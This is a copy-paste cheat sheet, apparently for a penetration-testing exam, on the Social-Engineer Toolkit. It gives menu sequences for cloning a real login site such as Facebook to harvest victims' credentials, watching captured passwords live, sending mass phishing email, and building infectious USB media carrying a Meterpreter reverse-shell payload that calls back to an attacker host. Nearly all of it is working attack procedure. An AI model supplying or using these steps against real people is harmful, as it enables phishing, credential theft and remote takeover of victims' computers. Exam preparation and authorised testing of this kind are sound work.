# 08 Social Engineering — copy-paste commands

> SET is **menu-driven**. These are the keystroke sequences, not bash commands.

## Launch

```bash
sudo setoolkit
# Accept terms: y
```

→ See [setoolkit.md](../tools/setoolkit.md)

## Credential Harvester — Site Cloner (the #1 exam task)

Menu path:
```
1) Social-Engineering Attacks
 2) Website Attack Vectors
  3) Credential Harvester Attack Method
   2) Site Cloner
    IP address for POST back in Harvester/Tabnabbing: <LHOST>
    Enter the url to clone: https://www.facebook.com
    Press return to continue...
```

- SET spins up an HTTP server on **port 80** at `<LHOST>`.
- Send the victim to `http://<LHOST>/`.
- When they submit the form, SET prints:
  ```
  PARAM: email=victim@example.com
  PARAM: pass=Summer2024!
  ```
- The report is also written to: `/root/.set/reports/` (filename `harvester_<YYYY-MM-DD HH:MM:SS.txt>`) and `/var/www/html/harvester_*.txt` in some builds.

**If port 80 is busy:**
```bash
sudo systemctl stop apache2
sudo fuser -k 80/tcp
```

## Credential Harvester — Web Templates (if you can't reach the real site)

```
1 → 2 → 3 → 1) Web Templates
Choose: Google / Facebook / Twitter
```

Same flow, but SET uses bundled static HTML instead of live-cloning.

## Mass Mailer

```
1) Social-Engineering Attacks
 5) Mass Mailer Attack
  1) E-Mail Attack Single Email Address
     (or)
  2) E-Mail Attack Mass Mailer
     → provide list file (one address per line)
     → Gmail / own SMTP → enter subject, body
```

## Infectious Media Generator

```
1) Social-Engineering Attacks
 3) Infectious Media Generator
  2) Standard Metasploit Executable
     → pick payload (windows/meterpreter/reverse_tcp)
     → LHOST / LPORT
```

Output lands in `~/.set/` — burn/ISO or copy to USB.

## Verify SET is serving the cloned page

```bash
curl -s http://<LHOST>/ | head
# Should return the HTML of the cloned site.
```

## Watch the harvested creds live

```bash
sudo tail -f /root/.set/reports/harvester_*.txt
```
